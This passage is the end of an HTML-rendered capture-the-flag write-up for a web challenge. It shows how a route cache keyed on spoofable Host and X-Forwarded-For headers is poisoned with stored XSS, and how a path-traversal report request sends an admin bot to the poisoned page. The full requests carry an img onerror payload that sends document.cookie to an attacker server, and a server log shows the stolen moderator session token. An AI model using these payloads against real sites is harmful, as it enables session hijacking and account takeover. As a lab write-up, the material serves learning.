+	<span class="hljs-keyword">return</span> <span class="hljs-string">`_<span class="hljs-subst">${req.headers.host}</span>_<span class="hljs-subst">${req.url}</span>_<span class="hljs-subst">${(req.headers[<span class="hljs-string">'x-forwarded-for'</span>] || req.ip)}</span>`</span>;
+}
+
+...snip...
+
+router.post(<span class="hljs-string">'/threads/preview'</span>, AuthMiddleware, routeCache.cacheSeconds(<span class="hljs-number">30</span>, cacheKey), <span class="hljs-keyword">async</span> (req, res) =&gt; {
+...snip...
+});
+
+router.get(<span class="hljs-string">'/threads/preview'</span>, AuthMiddleware, routeCache.cacheSeconds(<span class="hljs-number">30</span>, cacheKey), <span class="hljs-keyword">async</span> (req, res) =&gt; {
+	<span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">'/threads/new'</span>);
+});
+</div></code></pre>
+<p>The <strong>/threads/preview</strong> route has caching enabled with route-cache for 30 seconds with a defined <strong>cacheKey</strong>. This cacheKey is defined as a string containing the Host header, the request URL and the IP of the sender <strong>OR</strong> the content of the X-Forwarded-For header. This means that a route will be cached for 30 seconds for a client that matches the cacheKey. That is, if the host header, URL and IP (or X-Forwarded-For header) for a request is the same, the cached response will be returned instead of processing the new request.</p>
+<p>This is just what we needed; now we can make a POST request to <strong>/threads/preview</strong> faking the headers to match the key that the bot would match and containing XSS. When the bot makes a request to GET the same URL, the bot will get the cached response with XSS!</p>
+<p>So let's try that out. We add the X-Forwarded-For header and change the host header to match 127.0.0.1:1337, which is the IP that the bot uses:</p>
+<h3 id="request-1-inject-xss">Request 1 (Inject XSS)</h3>
+<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">/threads/preview?123</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 127.0.0.1:1337
+<span class="hljs-attribute">X-Forwarded-For</span>: 127.0.0.1
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
+<span class="hljs-attribute">Content-Length</span>: 140
+<span class="hljs-attribute">Origin</span>: http://192.168.1.118:1337
+<span class="hljs-attribute">DNT</span>: 1
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://192.168.1.118:1337/threads/new
+<span class="hljs-attribute">Cookie</span>: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoibXl1c2VyIiwicmVwdXRhdGlvbiI6MCwiY3JlZGl0cyI6MTAwLCJ1c2VyX3JvbGUiOiJOZXdiaWUiLCJhdmF0YXIiOiJuZXdiaWUud2VicCIsImpvaW5lZCI6IjIwMjItMDctMTkgMjA6MTI6MzUiLCJpYXQiOjE2NTgyNjk1Mzd9.VavmLYqwPLmxWSx7L13cGLZRCUTKrtwE6zzEdwNotms
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+
+<span class="sas"><span class="hljs-meta">title</span>=<span class="hljs-variable">&amp;content</span>=xss_here![](http://&lt;my_server_ip&gt;/img<span class="hljs-string">"onerror="</span><span class="hljs-meta">window</span>.location=<span class="hljs-string">'http://&lt;my_server_ip&gt;/'</span>%2bdocument.cookie)<span class="hljs-variable">&amp;cat_id</span>=2
+</span></div></code></pre>
+<h3 id="response-1-inject-xss">Response 1 (Inject XSS)</h3>
+<pre class="hljs"><code><div>HTTP/1.1 <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">X-Powered-By</span>: Express
+<span class="hljs-attribute">Content-Type</span>: text/html; charset=utf-8
+<span class="hljs-attribute">Content-Length</span>: 7241
+<span class="hljs-attribute">ETag</span>: W/"1c49-wZFYIEebTM5A+qV6pLY4g62Kr6s"
+<span class="hljs-attribute">Date</span>: Tue, 19 Jul 2022 22:47:59 GMT
+<span class="hljs-attribute">Connection</span>: close
+
+<span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
+   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Felonious Forums | Preview Thread
+...snip...
+<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"_pcon"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xss_here<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://&lt;my_server_ip&gt;/img"</span><span class="hljs-attr">onerror</span>=<span class="hljs-string">"window.location='http://&lt;my_server_ip&gt;/'+document.cookie"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+..snip...
+</span></div></code></pre>
+<p>Now we can simulate a GET request like the one the bot would make:</p>
+<h3 id="request-2-simulate-bot-request-optional">Request 2 (Simulate Bot request. Optional)</h3>
+<pre class="hljs"><code><div><span class="hljs-keyword">GET</span> <span class="hljs-string">/threads/preview?123</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 127.0.0.1:1337
+<span class="hljs-attribute">X-Forwarded-For</span>: 127.0.0.1
+<span class="hljs-attribute">Cookie</span>: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoibXl1c2VyIiwicmVwdXRhdGlvbiI6MCwiY3JlZGl0cyI6MTAwLCJ1c2VyX3JvbGUiOiJOZXdiaWUiLCJhdmF0YXIiOiJuZXdiaWUud2VicCIsImpvaW5lZCI6IjIwMjItMDctMTkgMjA6MTI6MzUiLCJpYXQiOjE2NTgyNjk1Mzd9.VavmLYqwPLmxWSx7L13cGLZRCUTKrtwE6zzEdwNotms
+</div></code></pre>
+<h3 id="response-2-simulate-bot-request-optional">Response 2 (Simulate Bot request. Optional)</h3>
+<pre class="hljs"><code><div>HTTP/1.1 <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">X-Powered-By</span>: Express
+<span class="hljs-attribute">Content-Type</span>: text/html; charset=utf-8
+<span class="hljs-attribute">Content-Length</span>: 7241
+<span class="hljs-attribute">ETag</span>: W/"1c49-wZFYIEebTM5A+qV6pLY4g62Kr6s"
+<span class="hljs-attribute">Date</span>: Tue, 19 Jul 2022 22:48:04 GMT
+<span class="hljs-attribute">Connection</span>: keep-alive
+<span class="hljs-attribute">Keep-Alive</span>: timeout=5
+
+<span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
+   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Felonious Forums | Preview Thread<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+...snip...
+<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"_pcon"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xss_here<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://&lt;my_server_ip&gt;/img"</span><span class="hljs-attr">onerror</span>=<span class="hljs-string">"window.location='http://&lt;my_server_ip&gt;/'+document.cookie"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+...snip...
+</span></div></code></pre>
+<p>You can see the ETag returned is the same, which indicates we're hitting the cached content. Now all that's left is sending the bot to this page:</p>
+<h3 id="request-3-send-the-bot-to-the-cached-page">Request 3 (Send the bot to the cached page)</h3>
+<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/report</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 192.168.1.118:1337
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: application/json
+<span class="hljs-attribute">Content-Length</span>: 36
+<span class="hljs-attribute">DNT</span>: 1
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Cookie</span>: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoibXl1c2VyIiwicmVwdXRhdGlvbiI6MCwiY3JlZGl0cyI6MTAwLCJ1c2VyX3JvbGUiOiJOZXdiaWUiLCJhdmF0YXIiOiJuZXdiaWUud2VicCIsImpvaW5lZCI6IjIwMjItMDctMTkgMjA6MTI6MzUiLCJpYXQiOjE2NTgyNjk1Mzd9.VavmLYqwPLmxWSx7L13cGLZRCUTKrtwE6zzEdwNotms
+
+<span class="json">{<span class="hljs-attr">"post_id"</span>:<span class="hljs-string">"../threads/preview?123"</span>}
+</span></div></code></pre>
+<h3 id="response-3-send-the-bot-to-the-cached-page">Response 3 (Send the bot to the cached page)</h3>
+<pre class="hljs"><code><div>HTTP/1.1 <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">X-Powered-By</span>: Express
+<span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8
+<span class="hljs-attribute">Content-Length</span>: 43
+<span class="hljs-attribute">ETag</span>: W/"2b-NN8PPBl7kFrrzCrU/wo9zyOL7/A"
+<span class="hljs-attribute">Date</span>: Tue, 19 Jul 2022 22:48:17 GMT
+<span class="hljs-attribute">Connection</span>: close
+
+<span class="json">{<span class="hljs-attr">"message"</span>:<span class="hljs-string">"Report received successfully!"</span>}
+</span></div></code></pre>
+<p>Server returned an ok response, so we check our remote server to see what we got:</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># python3 -m http.server 8000</span>
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+&lt;my_home_ip&gt; - - [19/Jul/2022 22:48:15] <span class="hljs-string">"GET /img HTTP/1.1"</span> 200 -
+&lt;my_home_ip&gt; - - [19/Jul/2022 22:48:15] code 404, message File not found
+&lt;my_home_ip&gt; - - [19/Jul/2022 22:48:15] <span class="hljs-string">"GET /session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVzZXJfcm9sZSI6Im1vZGVyYXRvciIsImZsYWciOiJIVEJ7ZjRrM19mbDRnX2Ywcl90M3N0MW5nfVxuIiwiaWF0IjoxNjU4MjcwODk0fQ.-nCvjIlXyWw2HDIfPuX_Rq7I4_uGnNuujQjLh0kjBj4
+</span></div></code></pre>
+<p>We decode the JWT payload, and there it is:</p>
+<pre class="hljs"><code><div>{<span class="hljs-attr">"username"</span>:<span class="hljs-string">"moderator"</span>,<span class="hljs-attr">"user_role"</span>:<span class="hljs-string">"moderator"</span>,<span class="hljs-attr">"flag"</span>:<span class="hljs-string">"HTB{f4k3_fl4g_f0r_t3st1ng}\n"</span>,<span class="hljs-attr">"iat"</span>:<span class="hljs-number">1658270894</span>}
+</div></code></pre>
+<h2 id="conlusion">Conlusion</h2>
+<p>This was a really interesting challenge for me, because I had never exploited an application abusing its caching mechanism. Now I'll know to pay more attention to these details in the future. It was also my first international CTF, so it was exciting and humbling. I couldn't get this flag in time (I noticed the cache stuff about 30 minutes before it ended), but sure was happy to have solved the challenge nonetheless.</p>
+
+</body>
+</html>
